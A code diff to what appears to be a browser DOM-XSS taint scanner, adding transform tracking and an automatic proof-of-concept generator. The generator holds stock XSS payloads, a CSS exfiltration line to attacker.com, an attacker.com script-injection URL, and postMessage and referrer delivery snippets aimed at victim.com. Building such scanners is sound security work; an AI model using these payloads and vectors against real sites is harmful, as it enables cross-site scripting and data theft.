@@ -43843,16 +43843,31 @@ ${rootStack}`;
   }
 
   // src/worker/taint.js
-  var TaintLabel = class {
-    constructor(sourceType, file, line, col, description) {
+  var _NO_TRANSFORMS = [];
+  var TaintLabel = class _TaintLabel {
+    constructor(sourceType, file, line, col, description, transforms, sourceKey) {
       this.sourceType = sourceType;
       this.file = file;
       this.line = line;
       this.col = col;
       this.description = description;
+      this.transforms = transforms || _NO_TRANSFORMS;
+      this.sourceKey = sourceKey || null;
     }
     get id() {
       return `${this.sourceType}@${this.file}:${this.line}:${this.col}`;
+    }
+    withTransform(op) {
+      const l = new _TaintLabel(
+        this.sourceType,
+        this.file,
+        this.line,
+        this.col,
+        this.description,
+        this.transforms === _NO_TRANSFORMS ? [op] : [...this.transforms, op]
+      );
+      l.sourceKey = this.sourceKey;
+      return l;
     }
   };
   var _EMPTY_MAP = Object.freeze(/* @__PURE__ */ new Map());
@@ -43900,6 +43915,13 @@ ${rootStack}`;
     }
     toArray() {
       return this.labels !== null ? [...this.labels.values()] : [];
+    }
+    // Create a new TaintSet with a transform appended to all labels
+    withTransform(op) {
+      if (this.labels === null || this.labels.size === 0) return this;
+      const newLabels = /* @__PURE__ */ new Map();
+      for (const [id, label] of this.labels) newLabels.set(id, label.withTransform(op));
+      return new _TaintSet(newLabels);
     }
   };
   var FuncMap = class _FuncMap {
@@ -44420,7 +44442,14 @@ ${rootStack}`;
     return node.loc?.start || {};
   }
   function formatSources(taint) {
-    return taint.toArray().map((l) => ({ type: l.sourceType, description: l.description, file: l.file, line: l.line }));
+    return taint.toArray().map((l) => ({
+      type: l.sourceType,
+      description: l.description,
+      file: l.file,
+      line: l.line,
+      transforms: l.transforms.length > 0 ? l.transforms : void 0,
+      sourceKey: l.sourceKey || void 0
+    }));
   }
   function makeSinkInfo(expression, ctx, loc) {
     return { expression, file: ctx.file, line: loc.line || 0, col: loc.column || 0 };
@@ -46062,6 +46091,15 @@ ${rootStack}`;
       return TaintSet.empty();
     }
     let cur = node;
+    const outerProps = [];
+    const applyOuterProps = (taint) => {
+      if (!taint.tainted || outerProps.length === 0) return taint;
+      let result = taint;
+      for (let i = outerProps.length - 1; i >= 0; i--) {
+        result = result.withTransform({ op: "property", args: [outerProps[i]] });
+      }
+      return result;
+    };
     while (cur.type === "MemberExpression" || cur.type === "OptionalMemberExpression") {
       let sourceLabel = checkMemberSource(cur);
       if (!sourceLabel && cur.computed && cur.property) {
@@ -46076,14 +46114,14 @@ ${rootStack}`;
       }
       if (sourceLabel) {
         const loc = getNodeLoc(cur);
-        return TaintSet.from(new TaintLabel(sourceLabel, ctx.file, loc.line || 0, loc.column || 0, nodeToString(cur)));
+        return applyOuterProps(TaintSet.from(new TaintLabel(sourceLabel, ctx.file, loc.line || 0, loc.column || 0, nodeToString(cur))));
       }
       const fullStr = nodeToString(cur);
       if (fullStr) {
         const resolvedStr = resolveAliasedPath(fullStr, env);
         if (resolvedStr !== fullStr && MEMBER_SOURCES[resolvedStr]) {
           const loc = getNodeLoc(cur);
-          return TaintSet.from(new TaintLabel(MEMBER_SOURCES[resolvedStr], ctx.file, loc.line || 0, loc.column || 0, resolvedStr));
+          return applyOuterProps(TaintSet.from(new TaintLabel(MEMBER_SOURCES[resolvedStr], ctx.file, loc.line || 0, loc.column || 0, resolvedStr)));
         }
       }
       if (!cur.computed && cur.object?.type === "Identifier") {
@@ -46092,20 +46130,20 @@ ${rootStack}`;
           const deepPath = `${alias}.${cur.property.name || cur.property.value}`;
           if (MEMBER_SOURCES[deepPath]) {
             const loc = getNodeLoc(cur);
-            return TaintSet.from(new TaintLabel(MEMBER_SOURCES[deepPath], ctx.file, loc.line || 0, loc.column || 0, deepPath));
+            return applyOuterProps(TaintSet.from(new TaintLabel(MEMBER_SOURCES[deepPath], ctx.file, loc.line || 0, loc.column || 0, deepPath)));
           }
         }
       }
       const fullPath2 = fullStr;
       if (fullPath2) {
-        if (env.has(fullPath2)) return env.get(fullPath2).clone();
+        if (env.has(fullPath2)) return applyOuterProps(env.get(fullPath2).clone());
       }
       if (!cur.computed && cur.object?.type === "Identifier" && cur.property) {
         const resolvedObjKey = resolveId(cur.object, ctx);
         const memberProp = cur.property.name || cur.property.value;
         if (memberProp) {
           const scopedPath = `${resolvedObjKey}.${memberProp}`;
-          if (env.has(scopedPath)) return env.get(scopedPath).clone();
+          if (env.has(scopedPath)) return applyOuterProps(env.get(scopedPath).clone());
         }
       }
       if (fullPath2) {
@@ -46113,7 +46151,7 @@ ${rootStack}`;
         if (getterFunc && getterFunc.body) {
           const childEnv = (getterFunc._closureEnv || env).child();
           const getterTaint = analyzeInlineFunction(getterFunc, childEnv, ctx);
-          if (getterTaint.tainted) return getterTaint;
+          if (getterTaint.tainted) return applyOuterProps(getterTaint);
         }
       }
       const propName = !cur.computed && cur.property ? cur.property.name || cur.property.value : null;
@@ -46122,11 +46160,13 @@ ${rootStack}`;
       }
       if (cur.computed) {
         const objTaint = evaluateExpr(cur.object, env, ctx);
-        return evaluateComputedMember(cur, objTaint, env, ctx);
+        return applyOuterProps(evaluateComputedMember(cur, objTaint, env, ctx));
       }
+      if (propName) outerProps.push(propName);
       cur = cur.object;
     }
-    return evaluateExpr(cur, env, ctx);
+    const rootTaint = evaluateExpr(cur, env, ctx);
+    return applyOuterProps(rootTaint);
   }
   function evaluateComputedMember(node, objTaint, env, ctx) {
     const keyTaint = evaluateExpr(node.property, env, ctx);
@@ -46143,13 +46183,25 @@ ${rootStack}`;
     if (litKey !== null && isDirectLiteral) {
       const objStr2 = nodeToString(node.object);
       if (objStr2) {
-        if (env.has(`${objStr2}.${litKey}`)) return env.get(`${objStr2}.${litKey}`).clone();
-        if (/^\d+$/.test(litKey) && env.has(`${objStr2}.#idx_${litKey}`)) return env.get(`${objStr2}.#idx_${litKey}`).clone();
+        if (env.has(`${objStr2}.${litKey}`)) {
+          const t = env.get(`${objStr2}.${litKey}`).clone();
+          return t.tainted && /^\d+$/.test(litKey) ? t.withTransform({ op: "index", args: [Number(litKey)] }) : t;
+        }
+        if (/^\d+$/.test(litKey) && env.has(`${objStr2}.#idx_${litKey}`)) {
+          const t = env.get(`${objStr2}.#idx_${litKey}`).clone();
+          return t.tainted ? t.withTransform({ op: "index", args: [Number(litKey)] }) : t;
+        }
       }
       if (node.object?.type === "Identifier") {
         const resolvedKey = resolveId(node.object, ctx);
-        if (env.has(`${resolvedKey}.${litKey}`)) return env.get(`${resolvedKey}.${litKey}`).clone();
-        if (/^\d+$/.test(litKey) && env.has(`${resolvedKey}.#idx_${litKey}`)) return env.get(`${resolvedKey}.#idx_${litKey}`).clone();
+        if (env.has(`${resolvedKey}.${litKey}`)) {
+          const t = env.get(`${resolvedKey}.${litKey}`).clone();
+          return t.tainted && /^\d+$/.test(litKey) ? t.withTransform({ op: "index", args: [Number(litKey)] }) : t;
+        }
+        if (/^\d+$/.test(litKey) && env.has(`${resolvedKey}.#idx_${litKey}`)) {
+          const t = env.get(`${resolvedKey}.#idx_${litKey}`).clone();
+          return t.tainted ? t.withTransform({ op: "index", args: [Number(litKey)] }) : t;
+        }
       }
     }
     if (litKey !== null && !isDirectLiteral) {
@@ -46186,7 +46238,10 @@ ${rootStack}`;
         }
       }
     }
-    if (objTaint.tainted) return objTaint.clone();
+    if (objTaint.tainted) {
+      const propName = !node.computed && node.property ? node.property.name || node.property.value : litKey;
+      return propName ? objTaint.withTransform({ op: "property", args: [propName] }) : objTaint.clone();
+    }
     return objTaint;
   }
   function isCalleeMatch(node, objectName, methodName, env) {
@@ -46672,9 +46727,21 @@ ${rootStack}`;
     }
     if (calleeStr && CALL_SOURCES[calleeStr] && CALL_SOURCES[calleeStr] !== "passthrough") {
       const loc = getNodeLoc(node);
-      return TaintSet.from(new TaintLabel(CALL_SOURCES[calleeStr], ctx.file, loc.line || 0, loc.column || 0, calleeStr + "()"));
+      const firstArg = node.arguments?.[0] ? resolveToConstant(node.arguments[0], env, ctx) : void 0;
+      const label = new TaintLabel(
+        CALL_SOURCES[calleeStr],
+        ctx.file,
+        loc.line || 0,
+        loc.column || 0,
+        firstArg !== void 0 ? `${calleeStr}(${JSON.stringify(firstArg)})` : calleeStr + "()"
+      );
+      if (typeof firstArg === "string") label.sourceKey = firstArg;
+      return TaintSet.from(label);
     }
-    if (calleeStr && isPassthrough(calleeStr)) return argTaints[0]?.clone() || TaintSet.empty();
+    if (calleeStr && isPassthrough(calleeStr)) {
+      const base = argTaints[0]?.clone() || TaintSet.empty();
+      return base.tainted ? base.withTransform({ op: calleeStr }) : base;
+    }
     if (methodName && (node.callee?.type === "MemberExpression" || node.callee?.type === "OptionalMemberExpression")) {
       const fullPath = nodeToString(node.callee);
       if (fullPath && ctx.funcMap.has(fullPath)) {
@@ -46947,14 +47014,17 @@ ${rootStack}`;
       case "at":
       case "charAt":
       case "valueOf":
-      case "toString":
-        return objTaint.clone();
+      case "toString": {
+        if (!objTaint.tainted) return objTaint.clone();
+        const cArgs = resolveConstantArgs(node.arguments, env, ctx);
+        return objTaint.withTransform({ op: methodName, args: cArgs });
+      }
       case "padStart":
       case "padEnd":
         return objTaint.clone().merge(argTaints[1] || TaintSet.empty());
       case "match":
       case "matchAll":
-        return objTaint.clone();
+        return objTaint.tainted ? objTaint.withTransform({ op: methodName }) : objTaint.clone();
       case "exec":
         return argTaints[0]?.clone() || TaintSet.empty();
       case "search":
@@ -46985,10 +47055,17 @@ ${rootStack}`;
       case "concat":
         return objTaint.clone().merge(argTaints.reduce((a, t) => a.merge(t), TaintSet.empty()));
       case "replace":
-      case "replaceAll":
-        return objTaint.clone().merge(argTaints[1] || TaintSet.empty());
-      case "split":
-        return objTaint.clone();
+      case "replaceAll": {
+        const result = objTaint.clone().merge(argTaints[1] || TaintSet.empty());
+        if (!result.tainted) return result;
+        const cArgs = resolveConstantArgs(node.arguments, env, ctx);
+        return result.withTransform({ op: methodName, args: cArgs });
+      }
+      case "split": {
+        if (!objTaint.tainted) return objTaint.clone();
+        const cArgs = resolveConstantArgs(node.arguments, env, ctx);
+        return objTaint.withTransform({ op: "split", args: cArgs });
+      }
       case "join":
         return objTaint.clone().merge(argTaints[0] || TaintSet.empty());
       case "map": {
@@ -47260,7 +47337,12 @@ ${rootStack}`;
             }
           }
         }
-        if (objTaint.tainted) return objTaint.clone();
+        if (objTaint.tainted) {
+          if (getKeyStr != null) {
+            return objTaint.withTransform({ op: "get", args: [getKeyStr] });
+          }
+          return objTaint.clone();
+        }
         if (node.callee?.object) {
           const storageObj = node.callee.object;
           if (isGlobalRef(storageObj, "localStorage", env)) {
@@ -48496,6 +48578,289 @@ ${rootStack}`;
   function buildTaintPath(taintSet, sinkExpr) {
     return taintSet.toArray().map((label) => `${label.description} (${label.file}:${label.line}) \u2192 ${sinkExpr}`);
   }
+  function sinkPayload(sinkExpr, findingType) {
+    if (findingType === "Prototype Pollution") return '{"__proto__":{"polluted":true}}';
+    if (findingType === "CSS Injection") return "color:red;background:url(//attacker.com/steal)";
+    if (findingType === "Open Redirect") return "https://attacker.com/phish";
+    if (findingType === "Script Injection") return "https://attacker.com/xss.js";
+    const s = sinkExpr || "";
+    if (/\blocation\b|\.href|\.assign|\.replace|window\.open/i.test(s)) return "javascript:alert(1)";
+    if (/\beval\b|\bFunction\b|\bsetTimeout\b|\bsetInterval\b/i.test(s)) return "alert(1)";
+    if (/setAttribute.*on\w+/i.test(s)) return "alert(1)";
+    return "<img src=x onerror=alert(1)>";
+  }
+  function reverseTransforms(payload, transforms) {
+    const steps = [];
+    let value = payload;
+    for (let i = transforms.length - 1; i >= 0; i--) {
+      const t = transforms[i];
+      switch (t.op) {
+        case "slice":
+        case "substring":
+        case "substr": {
+          const start = typeof t.args[0] === "number" ? t.args[0] : 0;
+          if (start > 0) {
+            const pad = "_".repeat(start);
+            value = pad + value;
+            steps.unshift(`.${t.op}(${t.args.map((a) => JSON.stringify(a)).join(", ")}) strips first ${start} char(s)`);
+          }
+          break;
+        }
+        case "split": {
+          const sep = typeof t.args[0] === "string" ? t.args[0] : null;
+          const nextT = i + 1 < transforms.length ? transforms[i + 1] : null;
+          const isNextIndex = nextT && (nextT.op === "index" || nextT.op === "property" && /^\d+$/.test(nextT.args[0]));
+          if (sep !== null && isNextIndex) {
+          } else if (sep !== null) {
+            steps.unshift(`.split(${JSON.stringify(sep)}) splits on ${JSON.stringify(sep)}`);
+          }
+          break;
+        }
+        case "index": {
+          if (i === 0 || transforms[i - 1].op !== "split") {
+            steps.unshift(`[${t.args[0]}] selects element at index ${t.args[0]}`);
+          }
+          break;
+        }
+        case "replace":
+        case "replaceAll": {
+          const pattern = t.args[0];
+          const replacement = t.args[1];
+          if (typeof pattern === "string" && typeof replacement === "string") {
+            if (replacement === "" && !value.includes(pattern)) {
+              steps.unshift(`.${t.op}(${JSON.stringify(pattern)}, '') removes ${JSON.stringify(pattern)} (payload unaffected)`);
+            } else if (replacement !== "" && value.includes(replacement)) {
+              value = value.replace(replacement, pattern);
+              steps.unshift(`.${t.op}(${JSON.stringify(pattern)}, ${JSON.stringify(replacement)}) substitutes text`);
+            }
+          }
+          break;
+        }
+        case "decodeURIComponent":
+        case "decodeURI":
+          steps.unshift(`${t.op}() decodes URL-encoded input`);
+          break;
+        case "atob":
+          try {
+            value = btoa(value);
+          } catch {
+          }
+          steps.unshift("atob() decodes base64 \u2014 payload must be base64-encoded");
+          break;
+        case "btoa":
+          steps.unshift("btoa() encodes to base64 (taint carries through)");
+          break;
+        case "JSON.parse":
+          value = JSON.stringify(value);
+          steps.unshift("JSON.parse() parses JSON \u2014 payload must be valid JSON string");
+          break;
+        case "property": {
+          const prop = t.args[0];
+          if (prop && /^\d+$/.test(prop)) {
+            const prev = i > 0 ? transforms[i - 1] : null;
+            if (prev && prev.op === "split") {
+              const sep = typeof prev.args[0] === "string" ? prev.args[0] : null;
+              const idx = Number(prop);
+              if (sep !== null) {
+                if (idx > 0) {
+                  const prefix = ("x" + sep).repeat(idx);
+                  value = prefix + value;
+                }
+                steps.unshift(`.split(${JSON.stringify(sep)})[${idx}] takes segment at index ${idx}`);
+                break;
+              }
+            }
+            steps.unshift(`[${prop}] selects element at index ${prop}`);
+          } else if (prop) {
+            let jsonParseIdx = -1;
+            let scanIdx = i;
+            const propChain = [prop];
+            while (scanIdx > 0) {
+              const prevScan = transforms[scanIdx - 1];
+              if (prevScan.op === "property" && typeof prevScan.args[0] === "string" && !/^\d+$/.test(prevScan.args[0])) {
+                propChain.push(prevScan.args[0]);
+                scanIdx--;
+              } else if (prevScan.op === "JSON.parse") {
+                jsonParseIdx = scanIdx - 1;
+                break;
+              } else {
+                break;
+              }
+            }
+            if (jsonParseIdx >= 0) {
+              let wrapped = value;
+              for (const p of propChain) {
+                wrapped = JSON.stringify({ [p]: wrapped });
+              }
+              let obj = value;
+              for (const p of propChain) {
+                obj = { [p]: obj };
+              }
+              value = JSON.stringify(obj);
+              const keyList = [...propChain].reverse().map((p) => JSON.stringify(p)).join(".");
+              steps.unshift(`.${[...propChain].reverse().join(".")} reads from parsed JSON \u2014 payload must include ${keyList} path`);
+              i = jsonParseIdx;
+            } else {
+              steps.unshift(`.${prop} reads property "${prop}" from tainted object`);
+            }
+          }
+          break;
+        }
+        case "get": {
+          const getKey = t.args[0];
+          if (getKey != null) {
+            steps.unshift(`.get(${JSON.stringify(getKey)}) reads parameter ${JSON.stringify(getKey)}`);
+          }
+          break;
+        }
+        case "toLowerCase":
+        case "toUpperCase":
+          steps.unshift(`.${t.op}() changes case (payload unaffected)`);
+          break;
+        case "trim":
+        case "trimStart":
+        case "trimEnd":
+          steps.unshift(`.${t.op}() trims whitespace (payload unaffected)`);
+          break;
+        case "match":
+        case "matchAll":
+          steps.unshift(`.${t.op}() extracts regex matches from tainted string`);
+          break;
+        case "charAt":
+        case "at": {
+          const idx = typeof t.args[0] === "number" ? t.args[0] : 0;
+          steps.unshift(`.${t.op}(${idx}) extracts single character (limited exploitation)`);
+          break;
+        }
+        default:
+          if (t.op) steps.unshift(`${t.op}() transforms the data`);
+          break;
+      }
+    }
+    return { value, steps };
+  }
+  function buildNestedObject(propChain, value) {
+    let result = value;
+    for (let i = propChain.length - 1; i >= 0; i--) {
+      result = `{${JSON.stringify(propChain[i])}: ${typeof result === "string" && result.startsWith("{") ? result : JSON.stringify(result)}}`;
+    }
+    return result;
+  }
+  function wrapDelivery(sourceType, value, pageUrl, sourceKey, propertyChain) {
+    const page = pageUrl || "https://victim.com/page";
+    switch (sourceType) {
+      case "url.location.hash":
+        return { vector: `${page}#${value}`, description: "Navigate to URL with crafted fragment" };
+      case "url.location.search":
+        return { vector: `${page}?${value}`, description: "Navigate to URL with crafted query string" };
+      case "url.location.href":
+      case "url.document.URL":
+      case "url.document.documentURI":
+      case "url.document.baseURI":
+        return { vector: `${page}?${value}#${value}`, description: "Navigate to URL with crafted query/fragment" };
+      case "url.location.pathname":
+        return { vector: `https://victim.com/${value}`, description: "Navigate to URL with crafted path" };
+      case "url.searchParam": {
+        const paramName = sourceKey || "param";
+        return { vector: `${page}?${paramName}=${encodeURIComponent(value)}`, description: `Navigate to URL with crafted "${paramName}" query parameter` };
+      }
+      case "cookie": {
+        const cookieName = sourceKey || "key";
+        return { vector: `document.cookie = "${cookieName}=${value}"`, description: `Set cookie "${cookieName}" via JavaScript console (requires prior XSS or subdomain control)` };
+      }
+      case "storage.local": {
+        const storageKey = sourceKey || "key";
+        return { vector: `localStorage.setItem(${JSON.stringify(storageKey)}, ${JSON.stringify(value)})`, description: `Set localStorage key "${storageKey}" via JavaScript console (requires prior XSS on same origin)` };
+      }
+      case "storage.session": {
+        const storageKey = sourceKey || "key";
+        return { vector: `sessionStorage.setItem(${JSON.stringify(storageKey)}, ${JSON.stringify(value)})`, description: `Set sessionStorage key "${storageKey}" via JavaScript console (requires prior XSS on same origin)` };
+      }
+      case "postMessage.data":
+      case "postMessage (weak origin check)": {
+        let msgData;
+        if (propertyChain && propertyChain.length > 0) {
+          msgData = buildNestedObject(propertyChain, value);
+        } else {
+          msgData = JSON.stringify(value);
+        }
+        return {
+          vector: `// From attacker page:
+var w = window.open(${JSON.stringify(page)});
+setTimeout(() => w.postMessage(${msgData}, '*'), 1000);`,
+          description: "Send postMessage from attacker-controlled window"
+        };
+      }
+      case "window.name":
+        return { vector: `window.open(${JSON.stringify(page)}, ${JSON.stringify(value)})`, description: "Open page with crafted window.name" };
+      case "url.hashchange":
+        return { vector: `location.hash = ${JSON.stringify("#" + value)}`, description: "Trigger hashchange event with crafted hash" };
+      case "url.document.referrer":
+        return { vector: `// Navigate from: https://attacker.com/redirect?to=${encodeURIComponent(page)}
+// Referrer header will contain attacker-controlled URL`, description: "Control document.referrer via navigation from attacker page" };
+      case "url.constructed":
+        return { vector: `new URL(${JSON.stringify(value)})`, description: "Constructed URL object carries taint from input" };
+      default:
+        return { vector: value, description: `Inject via ${sourceType}` };
+    }
+  }
+  var SOURCE_PREFIX_CHAR = {
+    "url.location.hash": "#",
+    "url.location.search": "?"
+  };
+  function generatePoC(finding) {
+    const sources = finding.source || [];
+    if (sources.length === 0) return null;
+    const primarySource = sources[0];
+    const transforms = primarySource.transforms || [];
+    const sinkExpr = finding.sink?.expression || "";
+    const payload = sinkPayload(sinkExpr, finding.type);
+    let { value: rawInput, steps } = reverseTransforms(payload, transforms);
+    const prefixChar = SOURCE_PREFIX_CHAR[primarySource.type];
+    if (prefixChar && transforms.length > 0) {
+      const first = transforms[0];
+      if ((first.op === "slice" || first.op === "substring" || first.op === "substr") && first.args[0] === 1) {
+        if (rawInput.startsWith("_")) rawInput = rawInput.slice(1);
+      }
+    }
+    const propertyChain = [];
+    for (const t of transforms) {
+      if (t.op === "property" && typeof t.args[0] === "string" && !/^\d+$/.test(t.args[0])) {
+        propertyChain.push(t.args[0]);
+      } else {
+        break;
+      }
+    }
+    let getParamName = null;
+    for (const t of transforms) {
+      if (t.op === "get" && t.args[0] != null) {
+        getParamName = String(t.args[0]);
+        break;
+      }
+    }
+    let effectiveSourceType = primarySource.type;
+    if (getParamName && (primarySource.type === "url.location.search" || primarySource.type === "url.location.href")) {
+      effectiveSourceType = "url.searchParam";
+    }
+    const delivery = wrapDelivery(effectiveSourceType, rawInput, null, primarySource.sourceKey || getParamName, propertyChain);
+    return {
+      payload,
+      input: rawInput,
+      vector: delivery.vector,
+      description: delivery.description,
+      steps,
+      transforms
+    };
+  }
+  function resolveConstantArgs(args, env, ctx) {
+    if (!args || args.length === 0) return [];
+    const result = [];
+    for (const arg of args) {
+      const v = resolveToConstant(arg, env, ctx);
+      result.push(v !== void 0 ? v : null);
+    }
+    return result;
+  }
 
   // src/worker/module-graph.js
   init_define_process_env();
@@ -49135,6 +49500,9 @@ ${rootStack}`;
     });
   }
   function postFindings(tabId, findings) {
+    for (const f of findings) {
+      if (!f.poc) f.poc = generatePoC(f);
+    }
     self.postMessage({
       type: "findings",
       tabId,
